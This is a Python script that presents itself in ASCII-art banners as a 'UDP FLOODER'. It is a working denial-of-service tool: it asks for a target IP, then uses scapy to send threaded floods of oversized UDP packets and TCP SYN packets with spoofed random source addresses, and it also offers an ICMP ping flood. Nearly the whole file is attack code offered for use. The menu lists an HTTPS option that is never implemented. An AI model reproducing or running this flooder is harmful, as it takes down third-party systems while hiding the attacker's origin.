import threading
import random
from scapy.all import *
import ping3

print("""
  _    _  _____   _____         ______  _       ____    ____   _____   ______  _____  
 | |  | ||  __ \ |  __ \       |  ____|| |     / __ \  / __ \ |  __ \ |  ____||  __ \ 
 | |  | || |  | || |__) |      | |__   | |    | |  | || |  | || |  | || |__   | |__) |
 | |  | || |  | ||  ___/       |  __|  | |    | |  | || |  | || |  | ||  __|  |  _  / 
 | |__| || |__| || |           | |     | |____| |__| || |__| || |__| || |____ | | \ \ 
  \____/ |_____/ |_|           |_|     |______|\____/  \____/ |_____/ |______||_|  \_\
                                                                                       
""")

print("""
                                        *@@&*(%@#@#.    &%    .%%,@*            .@#%(***./%*&*                                                                   
                                    (&/. #@&@@@&/.      .&/      .(&#            .@%(%,*/,% *@(                                                                   
                                #%#.                   ,@#**,,,/&#             #&,((/,/*/#*#/                                                                   
                            ,#(((.#*                     %&,/,..*@,           .#@ /(,/(#//(%&*                                                                   
                                */                      ,@,,.    (%         .#&(.%/(/(,,#/(##                                                                    
                                                        (@@@@@@@@@&.     ,%&#(,##,(%&/,* ,@(                                                                     
                                                        #%./,   ,,@/./&@% .#*#(..%..##%,.&(                                                                      
                                                        /@,((,   ,./&,(* ,%(#/  ,, .( ,/%@*                                                                       
                                                    ,(&@/,(*.    .,&(/#&/,#*,/#*.(/.,%&*                                                                         
                                                .(&%#, #**/.     ,.#&/.*%(//#/*((*#@#,                                                                           
                                                ,&%%* **,&**/       .##(%/#((%((%&&/.                                                                              
                                            *&&,  ,@&*.%*,(.      .#(,%%@@@%*                                                                                    
                                            ,%%. .#&#(&(.## ,.     ,,&/..                                                                                          
                                        *&(.,/%/ /#,(,,@,,,   .*,%%                                                                                             
                                        /@(./#%,,# ,/.#&%@,*,.   /@.                                                                                             
                                        ,@&((/#(/#.*(,(#. #&,**, /@,                                                                                              
                                    .  #@(,,##,/*@**&@(/(#@@&%%%@%((*,.....                                                                                      
                                %&,,%@&@@@@&#(#(((*,,...       . ...,,,...,*(%@@@@%%@(,/@*                                                                      
                                /&#/#&&@%%&&&&%%##(/,.  ,*. .,,**//////(((#%&&@&&#/#&#/%@.                                                                      
                                        #@, ./%**((#*,#@@%(#(/#%((/(&@#,,.                                                                                        
                                        *&%#(*/,*(. /(.,&&@(, .  .%&#%(                                                                                           
                                        /@/(#(%(/ */*(/(#..*#&&@@(,*&(                                                                                           
                                        &&..(###@/,##*(.  ,/. ,( .*%%&@#..                                                                                      
                                            /&, ,#/@. (%(/&*  .*.  .#...#%#&&@@(                                                                                   
                                            .#&*  #(#%((*,,#...,(,../%//%/,&  .%&*                                                                                
                                                /&%, *(*/%*  .//. ./%(/(/.&  ,((((%&,                                                                              
                                                *#&(*(/  #%#/*#%(*(%#(  /(*/(..#.&(                                                                             
                                                    ,&@@@(**(. *@%#/  #(,(* ,((*&*&/                                                                            
                                                    ,%//,, *&&@@#/#*%@@&, (@%##. */&/                                                                           
                                                    ,%/.   ,%(.**(@&#**(,%/(/ ,*.(./%,                                                                          
                                                    ,%#,   ,%(  ./%#&@#./%.,*,(, .#(&*                                                                          
                                                    ,%#,   .%/   ,###,#&,/(*(. #*(*,%*                                                                          
                                                    ,%#,   .%(    (##.,&%#/ ,#(# .%&#.                                                                          
                                                    ,%(,   .#/    /%#.*&#&(/(* #,*#&/                                                                           
                                                    *#(,   .(*    /%(/@(%* (#,(, ,&/                                                                            
                                                    *#(,   .(*    /%@&%/(../,.(*%&,                                                                             
                                                    *#(.   .(,    *%&(//%/#/ *(@(                                                                               
                                                    *%#,   .(*    *%@%## .#/#&(                                                                                 
                                                    *##.   .(*    *%&%&,/(#&*                                                                                   
                                                    .(@&/    .(/    *%&&*(@(.                                                                                     
                                               .#@%#@&,    .#/    ,%@&/.                                                                                        
                                            .#@#/%,/&%,    .#/    ,%#.                                                                                          
                                          ,%&/#%#*#%@&,    .#/    .##.                                                                                          
                                            %&*(*/*,#%&&%/    .#/     (#.                                                                                          
                                       /@,/&/%/*@.#@@%(    .(*    .(#.                                                                                          
                                     .%# #/##(*(@(. /#(     /,    ,%#.                                                                                          
                                      #%(@####%@/    /#/     ,.    .&%. *%&&&&&&%(,                                                                              
                                    ,&/#(%(#(&,     /%/            (&@&##(((/(//%/&%,                                                                           
                                    *%*&(%((%*      (#/          .(&%#(((@%@&%%%@###&/                                                                          
                                    *%/&%/&%%.      /%,       .#@%%((%&#%&,      *@%#&,                                                                         
                                    .%/*@&/(@(      ,%/.  ,#@&%/#*#(/&@,         (@%#&,                                                                         
""")



print(""" _______   __      __         ______   __        ________  ______  ________
/       \ /  \    /  |       /      \ /  |      /        |/      |/        |
$$$$$$$  |$$  \  /$$/       /$$$$$$  |$$ |      $$$$$$$$/ $$$$$$/ $$$$$$$$/
$$ |__$$ | $$  \/$$/        $$ |__$$ |$$ |      $$ |__      $$ |  $$ |__
$$    $$<   $$  $$/         $$    $$ |$$ |      $$    |     $$ |  $$    |
$$$$$$$  |   $$$$/          $$$$$$$$ |$$ |      $$$$$/      $$ |  $$$$$/
$$ |__$$ |    $$ |          $$ |  $$ |$$ |_____ $$ |       _$$ |_ $$ |_____
$$    $$/     $$ |          $$ |  $$ |$$       |$$ |      / $$   |$$       |
$$$$$$$/      $$/           $$/   $$/ $$$$$$$$/ $$/       $$$$$$/ $$$$$$$$/
""")



method = int(input("""What method?
1. UDP 
2. TCP
3. ICMP (Layer 3)
4. HTTPS (Layer 7):\n"""))






targ = str(input("What is the IP? "))
x = int(input("How many requests to send? "))
packet_size = 65000
threads = int(input("How many threads? "))





if packet_size < 28:
    raise ValueError("Packet size must be at least 40 bytes (20 for IP header + 20 for UDP header).")

def randomIP():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

done = False


def udp_method():
    global done
    c = 0
    payload_size = packet_size - 20 - 8  # Adjust for the IP header (20 bytes) and UDP header (8 bytes)
    payload = "A" * payload_size  # Create the payload

    while not done:
        for _ in range(x):
            Port = random.randrange(1,200)
            if done:
                break
                
            ip = IP(src=randomIP(), dst=targ) # type: ignore
            udp = UDP(dport=Port)  # type: ignore
            raw = Raw(load=payload)
            pkt = ip / udp / raw

                
            send(pkt, verbose=False)
            c += 1
            print("Sent ! Packet number: ", c, "UDP method")
        done = True
def tcp_method():
    
    global done
    c = 0
    payload_size = packet_size - 20 - 20  # Adjust for the IP header (20 bytes) and TCP header (20 bytes)
    payload = "A" * payload_size  # Create the payload
    Port = int(input("What port would you like to attack"))

    while not done:
        for _ in range(x):
            if done:
                break
                
            ip = IP(src=randomIP(), dst=targ)
            tcp = TCP(sport=random.randint(1,65000), dport=Port, flags="S") 
            raw = Raw(load=payload)
            pkt = ip / tcp / raw
            

                
            send(pkt, verbose = 0)
            c += 1
            print("Send SYN packet number: ", c)
        done = True
            
def icmp_method():
    global done
    while not done:
        for _ in range(x):
            if done:
                break
            if not done:
                d = ping3.verbose_ping(targ , size=1470 , timeout=ask_speed , interval=delay)
                print(d)
        done = True

            
    


    



if method == 1:
    for _ in range(threads): # Start x amount of threads
        t = threading.Thread(target=udp_method, daemon=True)
        t.start()
if method == 2:
    for _ in range(threads): # Start x amount of threads
        t = threading.Thread(target=tcp_method, daemon=True)
        t.start()
if method == 3:
    ask_speed = float(input("how often to check for output"))
    delay = float(input(f"How often to send {threads} amount of packets "))
    for _ in range(threads): # Start x amount of threads
        t = threading.Thread(target=icmp_method, daemon=True)
        t.start()







input("Press Enter to quit\n")
done = True



